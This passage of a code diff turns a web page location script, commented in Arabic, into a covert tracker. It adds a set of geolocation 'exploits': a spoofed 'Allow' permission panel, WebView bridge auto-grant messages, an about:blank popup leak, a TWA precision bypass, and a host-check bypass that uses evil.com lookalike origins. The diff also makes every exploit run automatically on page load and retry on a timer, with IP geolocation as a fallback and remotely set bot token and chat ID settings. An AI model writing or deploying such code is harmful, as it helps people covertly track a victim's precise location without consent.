+      '<button id="spoof-allow" style="padding:8px 20px;border:none;' +
+      'border-radius:6px;background:#1a73e8;color:#fff;font-size:14px">' +
+      'Allow</button>';
+    document.body.appendChild(panel);
+
+    document.getElementById('spoof-allow').addEventListener('click', function(){
+      // استخدام requestAnimationFrame المزدوج للسباق
+      requestAnimationFrame(function(){
+        requestAnimationFrame(function(){
+          // التنقل المؤقت (يعلق بسبب منفذ غير قياسي)
+          var port = 12345 + Math.floor(Math.random() * 1000);
+
+          // محاولة طلب الموقع بعد السباق
+          setTimeout(function(){
+            navigator.geolocation.getCurrentPosition(
+              function(pos){
+                log('✓✓ [CVE-2026-319486] نجحت! Origin Spoofing', 'success');
+                var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                            accuracy:pos.coords.accuracy,
+                            method:'cve-319486-firefox-ios',
+                            source:'Firefox iOS Spoof'};
+                displayLocation(info);
+                if(panel.parentNode) document.body.removeChild(panel);
+                resolve(info);
+              },
+              function(err){
+                log('✗ فشلت: ' + err.message, 'fail');
+                if(panel.parentNode) document.body.removeChild(panel);
+                resolve(null);
+              },
+              {enableHighAccuracy:true, timeout:8000}
+            );
+          }, 50);
+        });
+      });
+    });
+
+    setTimeout(function(){
+      if(panel.parentNode){
+        document.body.removeChild(panel);
+        log('✗ انتهت المهلة', 'fail');
+        resolve(null);
+      }
+    }, 20000);
+  });
+}
+
+/* ----------------------------------------------------------
+   [5] WebView Grant Bypass — callback.invoke(true, true)
+   الآلية: استغلال WebView الذي يمنح الإذن تلقائيًا
+   الشرط: تطبيق يستخدم WebView مع onGeolocationPermissionsShowPrompt غير آمن
+   ---------------------------------------------------------- */
+function exploit_WebView_Grant(){
+  return new Promise(function(resolve){
+    log('▶ [WebView Grant] محاولة استغلال جسر WebView…', 'vuln');
+
+    var hasBridge = Bridges.reactNative || Bridges.android || Bridges.androidLegacy || Bridges.iosWk;
+
+    if(!hasBridge){
+      log('✗ لا يوجد جسر WebView — لا يمكن استغلال هذه الثغرة', 'fail');
+      resolve(null); return;
+    }
+
+    // إرسال أوامر متعددة للجسر لطلب منح الإذن
+    Bridges.post('request_auto_grant', {origin: location.href});
+    Bridges.post('grant_location_permission', {origin: location.href});
+    Bridges.post('permission_denied', {code: 1});
+
+    // محاولة طلب الموقع مباشرة بعد الإشارة
+    setTimeout(function(){
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          log('✓✓ [WebView Grant] نجحت! WebView منح الإذن تلقائيًا', 'success');
+          var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                      accuracy:pos.coords.accuracy,
+                      method:'webview-grant',
+                      source:'WebView Auto-Grant'};
+          displayLocation(info);
+          resolve(info);
+        },
+        function(err){
+          log('✗ فشلت: ' + err.message, 'fail');
+          resolve(null);
+        },
+        {enableHighAccuracy:true, timeout:8000}
+      );
+    }, 1500);
+  });
+}
+
+/* ----------------------------------------------------------
+   [6] about:blank Geolocation Leak
+   الآلية: فتح نافذة about:blank ووراثة صلاحية الأصل الأب
+   الشرط: Chrome < 150 + أصل أب لديه إذن مسبق
+   ---------------------------------------------------------- */
+function exploit_AboutBlank(){
+  return new Promise(function(resolve){
+    log('▶ [about:blank] محاولة تسريب الموقع عبر about:blank…', 'vuln');
+
+    if(!BrowserInfo.isChrome || (BrowserInfo.chromeVersion > 0 && BrowserInfo.chromeVersion >= 150)){
+      log('✗ Chrome ' + BrowserInfo.chromeVersion + ' — مُصلحة', 'fail');
+      resolve(null); return;
+    }
+
+    try{
+      var popup = window.open('about:blank', '_blank', 'width=1,height=1');
+      if(!popup){
+        log('✗ النافذة المنبثقة محظورة', 'fail');
+        resolve(null); return;
+      }
+
+      var doc = popup.document;
+      doc.write('<!DOCTYPE html><html><body><script>' +
+        'try{' +
+        'navigator.geolocation.getCurrentPosition(' +
+        'function(p){window.opener.postMessage(JSON.stringify({' +
+        'type:"geo",lat:p.coords.latitude,lng:p.coords.longitude,' +
+        'acc:p.coords.accuracy}),"*");},' +
+        'function(e){window.opener.postMessage(JSON.stringify({' +
+        'type:"error",code:e.code}),"*");},' +
+        '{enableHighAccuracy:true,timeout:6000}' +
+        ');' +
+        '}catch(e){window.opener.postMessage(JSON.stringify({' +
+        'type:"error",msg:e.message}),"*");}' +
+        '<\/script></body></html>');
+      doc.close();
+
+      var handled = false;
+      function onMsg(ev){
+        try{
+          var d = typeof ev.data === 'string' ? JSON.parse(ev.data) : ev.data;
+          if(d.type === 'geo' && !handled){
+            handled = true;
+            log('✓✓ [about:blank] نجحت! تسريب الموقع', 'success');
+            var info = {lat:d.lat, lng:d.lng, accuracy:d.acc,
+                        method:'about-blank-leak', source:'about:blank'};
+            displayLocation(info);
+            try{ popup.close(); }catch(e){}
+            resolve(info);
+          }
+          if(d.type === 'error' && !handled){
+            handled = true;
+            log('✗ فشلت: code ' + d.code, 'fail');
+            try{ popup.close(); }catch(e){}
+            resolve(null);
+          }
+        }catch(e){}
+      }
+      window.addEventListener('message', onMsg);
+
+      setTimeout(function(){
+        if(!handled){
+          handled = true;
+          try{ popup.close(); }catch(e){}
+          log('✗ انتهت المهلة', 'fail');
+          resolve(null);
+        }
+      }, 10000);
+    }catch(e){
+      log('✗ خطأ: ' + e.message, 'fail');
+      resolve(null);
+    }
+  });
+}
+
+/* ----------------------------------------------------------
+   [7] TWA Location Delegation Bypass
+   الآلية: ترقية الصلاحية التقريبية إلى دقيقة عبر TWA
+   الشرط: Android 12+ مع تطبيق TWA
+   ---------------------------------------------------------- */
+function exploit_TWA_Bypass(){
+  return new Promise(function(resolve){
+    log('▶ [TWA Bypass] محاولة استغلال ترقية الصلاحيات…', 'vuln');
+
+    if(!BrowserInfo.isAndroid){
+      log('✗ يتطلب Android', 'fail');
+      resolve(null); return;
+    }
+
+    // إرسال إشارات متعددة للجسر لمحاكاة TWA
+    if(Bridges.reactNative || Bridges.android || Bridges.androidLegacy){
+      Bridges.post('request_precise_location', {});
+      Bridges.post('twa_delegate', {origin: location.href});
+      log('→ أُرسلت إشارات TWA للجسر');
+    }
+
+    // محاولة طلب الموقع بدقة عالية
+    setTimeout(function(){
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          var acc = pos.coords.accuracy || 9999;
+          if(acc < 100){
+            log('✓✓ [TWA] نجحت! دقة عالية ' + Math.round(acc) + 'م', 'success');
+            var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                        accuracy:acc, method:'twa-bypass',
+                        source:'TWA Precision Bypass'};
+            displayLocation(info);
+            resolve(info);
+          } else {
+            log('⚠ الدقة تقريبية: ' + Math.round(acc) + 'م — TWA لم تعمل', 'fail');
+            var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                        accuracy:acc, method:'twa-approx',
+                        source:'TWA (approximate only)'};
+            displayLocation(info);
+            resolve(null);
+          }
+        },
+        function(err){
+          log('✗ فشلت: ' + err.message, 'fail');
+          resolve(null);
+        },
+        {enableHighAccuracy:true, timeout:10000}
+      );
+    }, 1500);
+  });
+}
+
+/* ----------------------------------------------------------
+   [8] .contains() Host Check Bypass
+   الآلية: استغلال فحص مضيف غير آمن في WebView
+   الشرط: WebView يستخدم String.contains() لفحص الأصل
+   ---------------------------------------------------------- */
+function exploit_ContainsBypass(){
+  return new Promise(function(resolve){
+    log('▶ [.contains() Bypass] محاولة تجاوز فحص المضيف…', 'vuln');
+
+    var hasBridge = Bridges.reactNative || Bridges.android || Bridges.androidLegacy;
+
+    if(!hasBridge){
+      log('✗ لا يوجد جسر', 'fail');
+      resolve(null); return;
+    }
+
+    // محاولة حقن أصل يشبه الأصل الموثوق
+    var fakeOrigins = [
+      'https://trusted.app.evil.com',
+      'https://evil.com/trusted.app',
+      'https://not-trusted.app.com',
+      'https://trusted.app@evil.com'
+    ];
+
+    Bridges.post('navigate_to', {url: fakeOrigins[0]});
+    Bridges.post('request_location_via_bridge', {
+      injected_origin: fakeOrigins[0],
+      trick: 'contains_bypass'
+    });
+
+    // محاولة طلب الموقع بعد الحقن
+    setTimeout(function(){
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          log('✓✓ [.contains()] نجحت! تجاوز فحص المضيف', 'success');
+          var info = {lat:pos.coords.latitude, lng:pos.coords.longitude,
+                      accuracy:pos.coords.accuracy,
+                      method:'contains-bypass',
+                      source:'.contains() Bypass'};
+          displayLocation(info);
+          resolve(info);
+        },
+        function(err){
+          log('✗ فشلت: ' + err.message, 'fail');
+          resolve(null);
+        },
+        {enableHighAccuracy:true, timeout:8000}
+      );
+    }, 1500);
+  });
+}
+
+/* ============================================================
+   مشغّل الثغرات
+   ============================================================ */
+var exploits = {
+  'cve13867':      { name: 'CVE-2026-13867 UI Spoofing',           fn: exploit_CVE_2026_13867 },
+  'cve79046':      { name: 'CVE-2026-79046 Race Condition',        fn: exploit_CVE_2026_79046 },
+  'cve84332':      { name: 'CVE-2026-84332 SiteSettings Bypass',   fn: exploit_CVE_2026_84332 },
+  'firefoxSpoof':  { name: 'CVE-2026-319486 Firefox iOS Spoof',    fn: exploit_Firefox_iOS_Spoof },
+  'webviewGrant':  { name: 'WebView Auto-Grant Bypass',            fn: exploit_WebView_Grant },
+  'aboutBlank':    { name: 'about:blank Geolocation Leak',         fn: exploit_AboutBlank },
+  'twaBypass':     { name: 'TWA Precision Bypass',                 fn: exploit_TWA_Bypass },
+  'containsBypass':{ name: '.contains() Host Check Bypass',        fn: exploit_ContainsBypass }
+};
+
+async function runExploit(key){
+  var ex = exploits[key];
+  if(!ex){ log('✗ ثغرة غير معروفة: ' + key, 'fail'); return null; }
+  setStatus('تشغيل: ' + ex.name + '…');
+  try{
+    var result = await ex.fn();
+    if(result){
+      activeVulns.push(ex.name);
+      vulnCountBadge.textContent = activeVulns.length + ' ثغرة نشطة';
+      vulnCountBadge.className = 'badge ok';
+      setStatus('✓ ' + ex.name + ' نجحت!', 'ok');
+    } else {
+      setStatus('✗ ' + ex.name + ' فشلت', 'err');
+    }
+    return result;
+  }catch(e){
+    log('✗ خطأ في ' + ex.name + ': ' + e.message, 'fail');
+    setStatus('✗ خطأ: ' + e.message, 'err');
+    return null;
+  }
+}
+
+async function runAllExploits(){
+  log('══════ تشغيل كل الثغرات ══════', 'vuln');
+  activeVulns = [];
+  vulnCountBadge.textContent = '0 ثغرة نشطة';
+  vulnCountBadge.className = 'badge';
+
+  for(var key in exploits){
+    if(activeVulns.length > 0){
+      log('→ تخطي ' + exploits[key].name + ' (نجحت ثغرة بالفعل)', 'success');
+      continue;
+    }
+    await runExploit(key);
+  }
+
+  if(activeVulns.length === 0){
+    log('══════ لم تنجح أي ثغرة — تجربة IP ══════', 'vuln');
+    await fallbackIP();
+  }
+}
+
+/* ============================================================
+   Fallback: IP Geolocation (تعمل دائمًا)
+   ============================================================ */
+async function fallbackIP(){
+  var providers = [
+    {url:'https://ipwho.is/', parse:function(d){
+      return d && d.success ? {lat:d.latitude, lng:d.longitude, accuracy:5000,
+        country:d.country, city:d.city, isp:d.connection && d.connection.isp,
+        method:'ip', source:'ipwho.is'} : null;
+    }},
+    {url:'https://ipapi.co/json/', parse:function(d){
+      return d && d.latitude && !d.error ? {lat:d.latitude, lng:d.longitude,
+        accuracy:5000, country:d.country_name, city:d.city, isp:d.org,
+        method:'ip', source:'ipapi.co'} : null;
+    }},
+    {url:'https://get.geojs.io/v1/ip/geo.json', parse:function(d){
+      return d && d.latitude ? {lat:parseFloat(d.latitude), lng:parseFloat(d.longitude),
+        accuracy:8000, country:d.country, city:d.city, isp:d.organization_name,
+        method:'ip', source:'geojs.io'} : null;
+    }}
+  ];
+
+  for(var i=0;i<providers.length;i++){
+    var p = providers[i];
+    log('→ محاولة IP: ' + p.url);
+    try{
+      var resp = await fetch(p.url);
+      var data = await resp.json();
+      var parsed = p.parse(data);
+      if(parsed && parsed.lat){
+        log('✓ IP نجح عبر ' + parsed.source, 'success');
+        displayLocation(parsed);
+        return parsed;
+      }
+    }catch(e){ log('✗ فشل: ' + e.message, 'fail'); }
+  }
+  log('✗ فشلت جميع خدمات IP', 'fail');
+  setStatus('تعذر تحديد الموقع بكل الطرق', 'err');
+  return null;
+}
+
+/* ============================================================
+   استقبال أوامر
+   ============================================================ */
+window.addEventListener('message', function(ev){
+  var raw = ev && ev.data; if(!raw) return;
+  var cmd = raw;
+  if(typeof raw === 'string'){ try{ cmd = JSON.parse(raw); }catch(e){ cmd = {type:raw}; } }
+  if(!cmd || !cmd.type) return;
+  log('← أمر: ' + cmd.type);
+  switch(cmd.type){
+    case 'grant_location_permission':
+      log('✓ التطبيق منح الإذن');
+      break;
+    case 'native_location':
+      if(cmd.data){
+        displayLocation({lat:cmd.data.latitude, lng:cmd.data.longitude,
+          accuracy:cmd.data.accuracy||20, method:'native', source:'Native Bridge'});
+      }
+      break;
+    case 'set_config':
+      if(cmd.data){
+        if(cmd.data.botToken) CONFIG.botToken = cmd.data.botToken;
+        if(cmd.data.chatId) CONFIG.chatId = cmd.data.chatId;
+      }
+      break;
+  }
+});
+
+/* ============================================================
+   الإقلاع
+   ============================================================ */
+async function boot(){
+  log('══════ بدء التشغيل ══════', 'vuln');
+  detectBrowser();
+  Bridges.detect();
   initMap();
 
-  // ✅ تحديد فوري (GPS ثم IP تلقائيًا)
-  await locate();
+  Bridges.post('webview_ready', {protocol:location.protocol, ua:navigator.userAgent});
+  Bridges.post('request_auto_grant', {origin:location.href});
 
-  // ✅ نبضة: تحديث تلقائي كل دقيقة
-  if(heartbeatTimer) clearInterval(heartbeatTimer);
-  heartbeatTimer = setInterval(async function(){
+  // ✅ تشغيل كل الثغرات تلقائيًا
+  await runAllExploits();
+
+  // نبضة تلقائية
+  setInterval(function(){
     if(latEl.textContent === '—'){
-      await locate();
-    } else if(watchId === null){
-      // لا يوجد GPS نشط → أعد المحاولة بـ IP
-      var ip = await tryIP();
-      if(ip) displayLocation(ip);
+      log('↻ نبضة: إعادة محاولة', 'vuln');
+      runAllExploits();
     }
   }, CONFIG.heartbeatMs);
 }
 
 if(document.readyState === 'complete' || document.readyState === 'interactive'){
-  setTimeout(boot, 0);
+  setTimeout(boot, 100);
 } else {
   document.addEventListener('DOMContentLoaded', boot);
 }
-
-window.addEventListener('beforeunload', function(){
-  if(watchId !== null){
-    try{ navigator.geolocation.clearWatch(watchId); }catch(e){}
-  }
-  if(heartbeatTimer) clearInterval(heartbeatTimer);
-});
 
 })();
 </script>
